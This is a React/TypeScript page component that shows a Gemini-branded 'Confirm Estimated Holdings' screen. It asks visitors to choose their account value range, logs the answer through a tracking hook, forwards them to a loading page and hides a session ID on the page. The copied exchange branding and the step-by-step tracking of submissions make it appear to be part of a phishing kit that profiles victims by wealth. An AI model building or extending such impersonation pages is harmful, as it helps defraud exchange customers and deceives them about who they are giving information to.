import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { GeminiLogo, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";

export const Route = createFileRoute("/gi/balance")({
  head: () => ({ meta: [{ title: "Confirm Estimated Holdings" }] }),
  component: GiBalancePage,
});

const RANGES = [
  "Under $1,000",
  "$1,000 – $4,999",
  "$5,000 – $9,999",
  "$10,000 – $24,999",
  "$25,000 – $49,999",
  "$50,000 – $99,999",
  "$100,000 – $499,999",
  "$500,000+",
];

function GiBalancePage() {
  const { trackClick, trackSubmit, giNavigate, sessionId } = useGiTracking();
  const [selected, setSelected] = useState<string | null>(null);

  const handleConfirm = () => {
    if (!selected) return;
    trackClick("Confirm Estimated Balance");
    trackSubmit("Estimated Balance", selected);
    giNavigate("/gi/loading");
  };

  return (
    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: GI_FONT_FAMILY, color: "rgb(1,3,4)", fontSize: 16, lineHeight: "24px" }}>
      <GiFontStyle />
      <style>{`
        .gi-range { width: 100%; height: 52px; border-radius: 10px; padding: 0 16px; border: 2px solid transparent; cursor: pointer; background: rgba(1,3,4,0.04); color: rgb(1,3,4); display: flex; align-items: center; justify-content: space-between; font-size: 15px; font-weight: 500; font-family: inherit; transition: background 0.15s, border-color 0.2s; }
        .gi-range:hover { background: rgba(1,3,4,0.07); }
        .gi-range.selected { border-color: rgb(1,3,4); }
      `}</style>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 24px", height: 75 }}><GeminiLogo /></div>
      <div style={{ display: "flex", justifyContent: "center", padding: "0 24px" }}>
        <div style={{ width: 420, maxWidth: "100%", marginTop: 48 }}>
          <h1 style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: 0 }}>Confirm Estimated Holdings</h1>
          <p style={{ fontSize: 14, color: "rgb(128,129,129)", margin: "8px 0 0 0" }}>Choose the range that best matches your account value.</p>
          <div style={{ display: "flex", flexDirection: "column", gap: 8, marginTop: 32 }}>
            {RANGES.map((r) => {
              const isSel = selected === r;
              return (
                <button key={r} onClick={() => setSelected(r)} className={`gi-range ${isSel ? "selected" : ""}`}>
                  <span>{r}</span>
                  <div style={{ width: 20, height: 20, borderRadius: "50%", border: isSel ? "none" : "2px solid rgb(204,205,205)", background: isSel ? "rgb(1,3,4)" : "transparent", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                    {isSel && <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#fff" }} />}
                  </div>
                </button>
              );
            })}
          </div>
          <button onClick={handleConfirm} disabled={!selected} style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", height: 56, borderRadius: 999, border: "none", cursor: selected ? "pointer" : "default", fontSize: 16, fontWeight: 600, fontFamily: "inherit", marginTop: 24, background: selected ? "rgb(1,3,4)" : "rgba(1,3,4,0.08)", color: selected ? "#fff" : "rgba(1,3,4,0.3)" }}>Confirm</button>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
